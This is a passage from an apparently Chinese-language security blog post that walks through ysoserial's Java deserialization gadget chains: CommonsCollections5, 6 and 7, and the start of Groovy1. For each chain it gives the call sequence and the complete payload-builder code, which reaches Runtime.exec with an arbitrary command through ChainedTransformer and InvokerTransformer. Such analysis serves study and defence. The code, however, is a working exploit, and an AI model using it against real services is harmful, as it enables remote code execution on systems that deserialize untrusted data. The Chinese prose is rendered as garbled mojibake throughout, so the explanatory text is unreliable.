æ–¹æ³•ä¸­ï¼Œä¼šè°ƒç”¨æˆå‘˜å˜é‡ <code>val</code> çš„ <code>toString</code> æ–¹æ³•</p><ul><li>è¿™é‡Œå°† <code>val</code> è®¾ç½®ä¸º TiedMapEntry</li><li>TiedMapEntry ä¼šè°ƒç”¨è‡ªèº«çš„ <code>getKey</code> å’Œ <code>getValue</code> æ–¹æ³•<ul><li><code>getKey</code> æ–¹æ³•ä¸­è°ƒç”¨æˆå‘˜å˜é‡ map çš„ <code>get</code> æ–¹æ³•</li><li>è¿™é‡Œå°† map è®¾ç½®ä¸º LazyMapï¼ˆ@CC1ï¼‰</li></ul></li></ul><p>ysoserial.payloads.CommonsCollections5 æ³¨æ„è¿™é‡Œåˆ©ç”¨åå°„è®¾ç½® <code>val</code> çš„å€¼ï¼Œå› ä¸º BadAttributeValueExpException çš„æ„é€ å‡½æ•°ä¼šåˆ¤æ–­æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºåœ¨åºåˆ—åŒ–æ—¶å°±ä¼šæ‰§è¡Œ <code>toString()</code>ï¼Œé‚£ä¹ˆååºåˆ—åŒ–æ—¶ï¼Œå› ä¸ºä¼ å…¥çš„ entry å·²ç»æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥å°±ä¸ä¼šè§¦å‘ toString æ–¹æ³•ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BadAttributeValueExpException <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€ æ¶æ„è°ƒç”¨é“¾ ChainedTransformer</span></span><br><span class="line"><span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line"><span class="comment">// inert chain for setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(</span><br><span class="line">        <span class="keyword">new</span> Transformer[]&#123; <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;);</span><br><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line"><span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line"><span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line"><span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€  LazyMapï¼Œå°†å…¶ factory å˜é‡è®¾ç½®ä¸º ChainedTransformer</span></span><br><span class="line"><span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line"><span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä½¿ç”¨ LazyMap æ„é€  TiedMapEntry</span></span><br><span class="line">TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† BadAttributeValueExpException çš„æˆå‘˜å˜é‡ val è®¾ç½®ä¸º TiedMapEntry</span></span><br><span class="line">BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    Reflections.setAccessible(valfield);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„èµ‹å€¼</span></span><br><span class="line">valfield.set(val, entry);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† ChainedTransformer ä¸­çš„ transformer æ•°ç»„æ›¿æ¢ä¸ºæ¶æ„è°ƒç”¨åºåˆ—</span></span><br><span class="line">Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers); <span class="comment">// arm with actual transformer chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><blockquote><p>CC5 + CC1<br>é€šè¿‡å¯¹ TiedMapEntry#getValue çš„è°ƒç”¨è§¦å‘ LazyMap#get<br>åˆ©ç”¨ ChainedTransformer æ„é€ é“¾å¼æ‰§è¡Œ</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 3.1</li><li>jdk 1.7</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    ObjectInputStream.readObject()</span><br><span class="line">        HashSet.readObject()</span><br><span class="line">            HashMap.put()</span><br><span class="line">            HashMap.hash()</span><br><span class="line">                TiedMapEntry.hashCode()</span><br><span class="line">                TiedMapEntry.getValue()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/jQaCHvLVX7IfBne.png" ><p>TiedMapEntry ä¸­çš„ equalsã€hashCodeã€toString æ–¹æ³•ä¸­éƒ½è°ƒç”¨äº† TiedMapEntry#getValueï¼Œè¿™é‡Œé€‰æ‹© hashCode æ–¹æ³•ä½œä¸ºå…¥å£ï¼ˆCC5 ç”¨çš„æ˜¯ toStringï¼‰ã€‚</p><p>HashSet#readObject ååºåˆ—åŒ–æ—¶ï¼Œä¼šè°ƒç”¨ map.put(e, PRESENT)æ–¹æ³•ï¼Œåç»­è°ƒç”¨ HashMap#putï¼Œåœ¨å…¶ä¸­ä¼šè°ƒç”¨ HashMap#put è®¡ç®—å“ˆå¸Œå€¼ï¼Œæœ€åè§¦å‘ TiedMapEntry.hashCodeï¼›</p><p>map å¯ä»¥æ§åˆ¶ä¸º HashMapï¼Œä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•° e æ˜¯ä½¿ç”¨ readObject è¯»å–ï¼Œç›¸åº”åœ°åœ¨ writeObject ä¸­å†™å…¥çš„ e æ˜¯ map.keySetï¼Œå› æ­¤é€šè¿‡åå°„ä¿®æ”¹ keySet çš„è¿”å›ç»“æœä¸º TiedMapEntryã€‚</p><p>ysoserial.payloads.CommonsCollections6#getObject é¦–å…ˆå®šä¹‰ ChainedTransformer å’Œ TiedMapEntryï¼ˆåŒCC5ï¼‰ï¼Œç„¶åé€šè¿‡åå°„å°† TiedMapEntry èµ‹å€¼ç»™ HashSet çš„ keySetã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Serializable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€ æ¶æ„è°ƒç”¨é“¾ ChainedTransformer</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[] &#123; command &#125;;</span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                    Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                    <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">            <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                    <span class="keyword">new</span> Class[] &#123; String.class &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>) &#125;;</span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€  LazyMapï¼Œå°†å…¶ factory å˜é‡è®¾ç½®ä¸º ChainedTransformer</span></span><br><span class="line">    <span class="keyword">final</span> Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="keyword">final</span> Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ä½¿ç”¨ LazyMap æ„é€  TiedMapEntry</span></span><br><span class="line">    TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡åå°„ä¿®æ”¹ keySet çš„è¿”å›ç»“æœä¸º TiedMapEntry</span></span><br><span class="line">    <span class="comment">// hashset çš„ map å±æ€§ï¼ˆHashMapï¼‰</span></span><br><span class="line">    HashSet map = <span class="keyword">new</span> HashSet(<span class="number">1</span>);   <span class="comment">// å®¹é‡ä¸º 1</span></span><br><span class="line">    map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">    Field f = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(f);</span><br><span class="line">    HashMap innimpl = (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// hashmap çš„ table å±æ€§ï¼ˆèŠ‚ç‚¹ node æ•°ç»„ï¼‰</span></span><br><span class="line">    Field f2 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(f2);</span><br><span class="line">    Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line">    <span class="comment">// ç¬¬ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">    Object node = array[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">        node = array[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°† TiedMapEntry å­˜å…¥ node èŠ‚ç‚¹çš„ key</span></span><br><span class="line">    Field keyField = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">        keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Reflections.setAccessible(keyField);</span><br><span class="line">    keyField.set(node, entry);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><blockquote><p>å’Œ CC6/CC5/CC1 ç±»ä¼¼ï¼Œä½¿ç”¨ ChainedTransformer æ‰¿è½½æ¶æ„ä»£ç <br>é€šè¿‡ AbstractMap#equals æ¥è§¦å‘ LazyMap#get æ–¹æ³•çš„è°ƒç”¨</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>commons-collections 3.1</li><li>jdk 1.8</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    Hashtable.readObject</span><br><span class="line">        Hashtable.reconstitutionPut</span><br><span class="line">            AbstractMapDecorator.equals</span><br><span class="line">                AbstractMap.equals</span><br><span class="line">                    LazyMap.get</span><br><span class="line">                        ChainedTransformer.transform</span><br><span class="line">                            InvokerTransformer.transform</span><br><span class="line">                                Method.invoke</span><br><span class="line">                                DelegatingMethodAccessorImpl.invoke</span><br><span class="line">                                NativeMethodAccessorImpl.invoke</span><br><span class="line">                                NativeMethodAccessorImpl.invoke0</span><br><span class="line">                                Runtime.exec</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/PAvzWR9u3k1VKSM.png" ><p>ysoserial.payloads.CommonsCollections7#getObject é¦–å…ˆæ„é€  ChainedTransformerï¼ˆåŒCC1ï¼‰ï¼Œç„¶ååˆ›å»ºä¸¤ä¸ª LazyMap ä½œä¸º HashTable çš„å…ƒç´ ï¼ˆ<code>&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()</code>ï¼‰ï¼Œæœ€åå°†ç¬¬äºŒä¸ª LazyMap ä¸­çš„å…ƒç´ ç§»é™¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Hashtable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[]&#123;command&#125;;</span><br><span class="line">    <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            execArgs),</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆ›å»º LazyMap ä½œä¸º Hashtable çš„å…ƒç´ </span></span><br><span class="line">    Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">    lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">    lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">    Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    hashtable.put(lazyMap1, <span class="number">1</span>); <span class="comment">// æ²¡æœ‰å€¼ï¼Œç›´æ¥å­˜</span></span><br><span class="line">    hashtable.put(lazyMap2, <span class="number">2</span>); <span class="comment">// æœ‰å€¼ï¼Œæ¯”è¾ƒåå†å­˜</span></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">    lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨ä¸¤æ¬¡ put æ–¹æ³•æ”¾å…¥ä¸¤ä¸ª LazyMap</p><ul><li>ååºåˆ—åŒ–æ—¶ï¼ŒreadObject å®é™…è°ƒç”¨çš„æ˜¯ reconstitutionPut</li><li>ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶ï¼Œä¼šæŠŠ key å’Œ value æ³¨å†Œåˆ° tab ä¸­</li><li>ç¬¬äºŒæ¬¡è°ƒç”¨æ—¶ï¼Œtab ä¸­æœ‰å†…å®¹åˆ™è¿›å…¥ for å¾ªç¯ä¸­ï¼Œä»è€Œè°ƒç”¨ equals æ–¹æ³•</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        K key = (K)s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        V value = (V)s.readObject();</span><br><span class="line">    <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">    reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashTable#put åœ¨ table ä¸­æœ‰å…ƒç´ æ—¶ä¼šè°ƒç”¨ equals æ–¹æ³•ï¼Œå½“è°ƒç”¨å®Œæ¯•åï¼ŒlazyMap2 çš„ key ä¸­å°±ä¼šå¢åŠ ä¸€ä¸ªé”®ä¸º yyï¼Œå€¼ä¸º UNIXProcess å®ä¾‹çš„å…ƒç´ ï¼Œè€Œ UNIXProcess æ²¡æœ‰ç»§æ‰¿ Serializableï¼Œæ— æ³•åºåˆ—åŒ–ï¼Œå› æ­¤éœ€è¦ç§»é™¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="keyword">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            V old = entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h2><blockquote><p>Groovy ä¸­ä½¿ç”¨ <code>&quot;command&quot;.execute()</code> æ‰§è¡Œå‘½ä»¤<br>ç”¨ MethodClosure æ‰¿è½½æŒ‡ä»¤ï¼Œç”¨äºå®ä¾‹åŒ– ConvertedClosure<br>ä½¿ç”¨ ConvertedClosure åˆ›å»º Map ç±»å‹ä»£ç†</p><ul><li>ConvertedClosure çš„çˆ¶ç±» ConversionHandler å®ç° InvocationHandlerï¼Œå¹¶é‡å†™äº† invoke æ–¹æ³•<br>åˆ›å»º AnnotationInvocationHandler ä»£ç†ï¼Œåœ¨ååºåˆ—åŒ–ä»£ç†æ—¶ï¼Œä¼šå¯¹ memberValues è°ƒç”¨ map.entrySetï¼Œè¿›ä¸€æ­¥è°ƒç”¨ ConversionHandler.invoke æ–¹æ³•ï¼Œå®é™…è°ƒç”¨ ConvertedClosure.invokeCustomï¼Œæœ€åè°ƒç”¨ MethodClosure çˆ¶ç±» Closure.call æ–¹æ³•</li></ul></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invokeCustom</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName!=<span class="keyword">null</span> &amp;&amp; !methodName.equals(method.getName())) <span class="keyword">return</span> <span 